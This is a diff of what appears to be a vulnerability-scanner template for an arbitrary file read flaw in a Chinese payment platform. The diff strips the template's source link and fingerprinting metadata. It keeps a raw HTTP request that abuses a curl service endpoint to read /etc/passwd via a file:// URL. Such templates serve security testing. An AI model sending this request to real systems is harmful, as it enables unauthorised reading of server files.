@@ -3,12 +3,8 @@ info:
   name: 码⽀付存在前台Service任意⽂件读取漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/duyg48a3y03fl386'
+  description: ''
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: duyg48a3y03fl386
-    fofa: '"/epaydoc/epaydoc.php"'
 http:
 - raw:
   - 'GET /pay/service/curl?url=file:///etc/passwd HTTP/1.1
